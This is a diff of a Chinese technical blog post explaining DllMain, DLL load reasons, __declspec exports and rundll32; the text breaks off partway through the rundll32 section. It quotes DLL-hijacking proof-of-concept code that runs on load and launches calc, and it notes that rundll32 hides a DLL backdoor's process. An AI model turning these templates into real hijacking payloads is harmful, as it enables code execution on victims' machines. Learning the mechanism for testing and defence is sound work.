@@ -52,64 +52,64 @@ https://cxsecurity.com/issue/WLB-2015010114
 <button type=button class=theme-ball role=button aria-label=切换主题 title=切换主题>
 <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4" fill="currentColor" stroke="none"/><line x1="12" y1="2" x2="12" y2="4"/><line x1="12" y1="20" x2="12" y2="22"/><line x1="4.9" y1="4.9" x2="6.3" y2="6.3"/><line x1="17.7" y1="17.7" x2="19.1" y2="19.1"/><line x1="2" y1="12" x2="4" y2="12"/><line x1="20" y1="12" x2="22" y2="12"/><line x1="4.9" y1="19.1" x2="6.3" y2="17.7"/><line x1="17.7" y1="6.3" x2="19.1" y2="4.9"/></svg>
 <svg class="icon-moon" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg></button></div></header><main class="prose prose-neutral dark:prose-invert relative mx-auto min-h-[calc(100vh-9rem)] max-w-(--w) px-8 pt-14 pb-16"><article><header class=mb-14><h1 class="my-0! pb-2.5">DllMain与rundll32详解</h1><div class="text-xs antialiased opacity-60"><time>Oct 2, 2019</time><span class=mx-1>&#183;</span>
-<span>倾旋</span></div></header><section><h2 id=0x00-dllmain>0x00 DllMain</h2><p>对于动态链接库，DllMain是一个<strong>可选的</strong>入口函数。</p><h3 id=程序调用dll中的导出函数的流程>程序调用DLL中的导出函数的流程</h3><ul><li>程序调用Windows API <code>LoadLibrary</code></li><li>操作系统寻找LoadLibrary所加载的DLL文件</li><li>操作系统将DLL文件加载至目标程序进程的内存空间</li><li>程序自动调用<code>DllMain</code>函数</li><li>程序调用DLL中导出函数</li></ul><p><strong>如果DLL被多次<code>LoadLibrary</code>，那么<code>DllMain</code>只执行一次，引用基数+1。</strong></p><h3 id=dllmain的原型>DllMain的原型</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c++ data-lang=c++><span style=display:flex><span>BOOL WINAPI <span style=color:#a6e22e>DllMain</span>(
-</span></span><span style=display:flex><span>  _In_ HINSTANCE hinstDLL, <span style=color:#75715e>// 指向自身的句柄
-</span></span></span><span style=display:flex><span>  _In_ DWORD fdwReason, <span style=color:#75715e>// 调用原因
-</span></span></span><span style=display:flex><span>  _In_ LPVOID lpvReserved <span style=color:#75715e>// 隐式加载和显式加载
-</span></span></span><span style=display:flex><span>);
-</span></span></code></pre></div><h2 id=0x01-dllmain调用原因>0x01 DllMain调用原因</h2><p>其中<code>fdwReason</code>用来表示Dll被调用的状态，一共分为四种：</p><ul><li>DLL_PROCESS_ATTACH 被进程加载</li><li>DLL_PROCESS_DETACH 被进程释放</li><li>DLL_THREAD_ATTACH 被线程加载</li><li>DLL_THREAD_DETACH 被线程释放</li></ul><p>在DllMain中通常为了捕获DLL被调用的方式来进行某些动作：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c++ data-lang=c++><span style=display:flex><span>BOOL APIENTRY <span style=color:#a6e22e>DllMain</span>( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
-</span></span><span style=display:flex><span>{
-</span></span><span style=display:flex><span>　<span style=color:#66d9ef>switch</span> (ul_reason_for_call)
-</span></span><span style=display:flex><span>　{
-</span></span><span style=display:flex><span>　　<span style=color:#66d9ef>case</span> DLL_PROCESS_ATTACH:
-</span></span><span style=display:flex><span>　　　printf(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>process attach of dll&#34;</span>);
-</span></span><span style=display:flex><span>　　　<span style=color:#66d9ef>break</span>;
-</span></span><span style=display:flex><span>　　<span style=color:#66d9ef>case</span> DLL_THREAD_ATTACH:
-</span></span><span style=display:flex><span>　　　printf(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>thread attach of dll&#34;</span>);
-</span></span><span style=display:flex><span>　　　<span style=color:#66d9ef>break</span>;
-</span></span><span style=display:flex><span>　　<span style=color:#66d9ef>case</span> DLL_THREAD_DETACH:
-</span></span><span style=display:flex><span>　　　printf(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>thread detach of dll&#34;</span>);
-</span></span><span style=display:flex><span>　　　<span style=color:#66d9ef>break</span>;
-</span></span><span style=display:flex><span>　　<span style=color:#66d9ef>case</span> DLL_PROCESS_DETACH:
-</span></span><span style=display:flex><span>　　　printf(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>process detach of dll&#34;</span>);
-</span></span><span style=display:flex><span>　　　<span style=color:#66d9ef>break</span>;
-</span></span><span style=display:flex><span>　}
-</span></span><span style=display:flex><span>　<span style=color:#66d9ef>return</span> TRUE;
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><h2 id=0x02-那些用于测试dll劫持的dllmain-poc>0x02 那些用于测试DLL劫持的DllMain POC</h2><ul><li><a href=https://cxsecurity.com/issue/WLB-2018090232>https://cxsecurity.com/issue/WLB-2018090232</a></li><li><a href=https://cxsecurity.com/issue/WLB-2015010114>https://cxsecurity.com/issue/WLB-2015010114</a></li></ul><p>在测试很多DLL劫持的漏洞时，都喜欢用DllMain，是因为DllMain被进程加载或者释放都会自动调用运行。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c++ data-lang=c++><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;windows.h&gt;</span><span style=color:#75715e>
-</span></span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>BOOL WINAPI <span style=color:#a6e22e>DllMain</span> (
-</span></span><span style=display:flex><span>            HANDLE    hinstDLL,
-</span></span><span style=display:flex><span>            DWORD     fdwReason,
-</span></span><span style=display:flex><span>            LPVOID    lpvReserved)
-</span></span><span style=display:flex><span>{
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>switch</span> (fdwReason)
-</span></span><span style=display:flex><span>  {
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>case</span> DLL_PROCESS_ATTACH:
-</span></span><span style=display:flex><span>    owned();
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>case</span> DLL_THREAD_ATTACH:
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>case</span> DLL_THREAD_DETACH:
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>case</span> DLL_PROCESS_DETACH:
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>break</span>;
-</span></span><span style=display:flex><span>  }
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> TRUE;
-</span></span><span style=display:flex><span>}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>owned</span>() {
-</span></span><span style=display:flex><span>  MessageBox(<span style=color:#ae81ff>0</span>, <span style=color:#e6db74>&#34;iExplorer DLL Hijacked\Hadji Samir&#34;</span>, <span style=color:#e6db74>&#34;POC&#34;</span>, MB_OK);
-</span></span><span style=display:flex><span>}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;windows.h&gt;</span><span style=color:#75715e>
-</span></span></span><span style=display:flex><span><span style=color:#75715e>#define DLLIMPORT __declspec (dllexport)
-</span></span></span><span style=display:flex><span> 
-</span></span><span style=display:flex><span>DLLIMPORT <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>HrCreateConverter</span>() { evil(); }
-</span></span><span style=display:flex><span> 
-</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>evil</span>()
-</span></span><span style=display:flex><span>{
-</span></span><span style=display:flex><span>  WinExec(<span style=color:#e6db74>&#34;calc&#34;</span>, <span style=color:#ae81ff>0</span>);
-</span></span><span style=display:flex><span>  exit(<span style=color:#ae81ff>0</span>);
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>}
+<span>倾旋</span></div></header><section><h2 id=0x00-dllmain>0x00 DllMain</h2><p>对于动态链接库，DllMain是一个<strong>可选的</strong>入口函数。</p><h3 id=程序调用dll中的导出函数的流程>程序调用DLL中的导出函数的流程</h3><ul><li>程序调用Windows API <code>LoadLibrary</code></li><li>操作系统寻找LoadLibrary所加载的DLL文件</li><li>操作系统将DLL文件加载至目标程序进程的内存空间</li><li>程序自动调用<code>DllMain</code>函数</li><li>程序调用DLL中导出函数</li></ul><p><strong>如果DLL被多次<code>LoadLibrary</code>，那么<code>DllMain</code>只执行一次，引用基数+1。</strong></p><h3 id=dllmain的原型>DllMain的原型</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=n>BOOL</span> <span class=n>WINAPI</span> <span class=nf>DllMain</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>  <span class=n>_In_</span> <span class=n>HINSTANCE</span> <span class=n>hinstDLL</span><span class=p>,</span> <span class=c1>// 指向自身的句柄
+</span></span></span><span class=line><span class=cl>  <span class=n>_In_</span> <span class=n>DWORD</span> <span class=n>fdwReason</span><span class=p>,</span> <span class=c1>// 调用原因
+</span></span></span><span class=line><span class=cl>  <span class=n>_In_</span> <span class=n>LPVOID</span> <span class=n>lpvReserved</span> <span class=c1>// 隐式加载和显式加载
+</span></span></span><span class=line><span class=cl><span class=p>);</span>
+</span></span></code></pre></div><h2 id=0x01-dllmain调用原因>0x01 DllMain调用原因</h2><p>其中<code>fdwReason</code>用来表示Dll被调用的状态，一共分为四种：</p><ul><li>DLL_PROCESS_ATTACH 被进程加载</li><li>DLL_PROCESS_DETACH 被进程释放</li><li>DLL_THREAD_ATTACH 被线程加载</li><li>DLL_THREAD_DETACH 被线程释放</li></ul><p>在DllMain中通常为了捕获DLL被调用的方式来进行某些动作：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=n>BOOL</span> <span class=n>APIENTRY</span> <span class=nf>DllMain</span><span class=p>(</span> <span class=n>HANDLE</span> <span class=n>hModule</span><span class=p>,</span> <span class=n>DWORD</span> <span class=n>ul_reason_for_call</span><span class=p>,</span> <span class=n>LPVOID</span> <span class=n>lpReserved</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>　<span class=k>switch</span> <span class=p>(</span><span class=n>ul_reason_for_call</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>　<span class=p>{</span>
+</span></span><span class=line><span class=cl>　　<span class=k>case</span> <span class=nl>DLL_PROCESS_ATTACH</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>　　　<span class=n>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>process attach of dll&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>　　　<span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>　　<span class=k>case</span> <span class=nl>DLL_THREAD_ATTACH</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>　　　<span class=n>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>thread attach of dll&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>　　　<span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>　　<span class=k>case</span> <span class=nl>DLL_THREAD_DETACH</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>　　　<span class=n>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>thread detach of dll&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>　　　<span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>　　<span class=k>case</span> <span class=nl>DLL_PROCESS_DETACH</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>　　　<span class=n>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>process detach of dll&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>　　　<span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>　<span class=p>}</span>
+</span></span><span class=line><span class=cl>　<span class=k>return</span> <span class=n>TRUE</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><h2 id=0x02-那些用于测试dll劫持的dllmain-poc>0x02 那些用于测试DLL劫持的DllMain POC</h2><ul><li><a href=https://cxsecurity.com/issue/WLB-2018090232>https://cxsecurity.com/issue/WLB-2018090232</a></li><li><a href=https://cxsecurity.com/issue/WLB-2015010114>https://cxsecurity.com/issue/WLB-2015010114</a></li></ul><p>在测试很多DLL劫持的漏洞时，都喜欢用DllMain，是因为DllMain被进程加载或者释放都会自动调用运行。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;windows.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>BOOL</span> <span class=n>WINAPI</span> <span class=nf>DllMain</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl>            <span class=n>HANDLE</span>    <span class=n>hinstDLL</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=n>DWORD</span>     <span class=n>fdwReason</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=n>LPVOID</span>    <span class=n>lpvReserved</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>switch</span> <span class=p>(</span><span class=n>fdwReason</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=k>case</span> <span class=nl>DLL_PROCESS_ATTACH</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>owned</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>  <span class=k>case</span> <span class=nl>DLL_THREAD_ATTACH</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=nl>DLL_THREAD_DETACH</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=nl>DLL_PROCESS_DETACH</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>  <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>TRUE</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>owned</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=n>MessageBox</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=s>&#34;iExplorer DLL Hijacked\Hadji Samir&#34;</span><span class=p>,</span> <span class=s>&#34;POC&#34;</span><span class=p>,</span> <span class=n>MB_OK</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;windows.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#define DLLIMPORT __declspec (dllexport)
+</span></span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl><span class=n>DLLIMPORT</span> <span class=kt>void</span> <span class=nf>HrCreateConverter</span><span class=p>()</span> <span class=p>{</span> <span class=n>evil</span><span class=p>();</span> <span class=p>}</span>
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>evil</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=n>WinExec</span><span class=p>(</span><span class=s>&#34;calc&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
 </span></span></code></pre></div><h2 id=0x03-__declspec>0x03 __declspec</h2><p><code>__declspec</code>是Microsoft VC中专用的关键字，它配合着一些属性可以对标准C/C++进行扩充。<code>__declspec</code>关键字应该出现在声明的前面。</p><p><code>__declspec(dllexport)</code>用于Windows中的动态库中，声明导出函数、类、对象等供外面调用，省略给出.def文件。即将函数、类等声明为导出函数，供其它程序调用，作为动态库的对外接口函数、类等。</p><p><code>__declspec(dllimport)</code>用于Windows中，从别的动态库中声明导入函数、类、对象等供本动态库或exe文件使用。当你需要使用DLL中的函数时，往往不需要显示地导入函数，编译器可自动完成。</p><h2 id=0x04-关于rundll32>0x04 关于rundll32</h2><p>Rundll32.exe是什么？顾名思意，&ldquo;执行32位的DLL文件&rdquo;。它的作用是执行DLL文件中的内部函数，这样在进程当中，只会有Rundll32.exe，而不会有DLL后门的进程，这样，就实现了进程上的隐藏。</p><p>&ndash; 百度百科</p><p>经过如上解释，可以总结为，rundll32能够运行一个32位的dll文件，并且在进程列表中只能看到rundll32.exe，但是遍历rundll32.exe的模块列表可以看到进程加载的dll。</p><hr><p><strong>并不是所有的dll都能够被rundll32运行。</strong> 为何这么说，因为rundll32只支持特定的函数声明方式，并且该函数必须在dll文件的导出表中。关于导出表的知识可以阅读 - 《Windows PE权威指南》 👍</p><p>rundll32.exe支持的函数原型如下：</p><pre tabindex=0><code>VOID CALLBACK FunctionName (HWND hwnd,HINSTANCE hinst,LPTSTR lpCmdLine,INT nCmdShow);
 </code></pre><p>通过原型可以发现，与Windows平台下的<code>WinMain</code>一模一样，可以理解为rundll32调用的函数就是一段代码的入口函数。</p><p>下面来写一个支持rundll32运行的dll：</p><ol><li>使用visual studio新建一个dll工程，并声明函数：<code>rundll</code></li></ol><pre tabindex=0><code>#include &lt;Windows.h&gt;
 
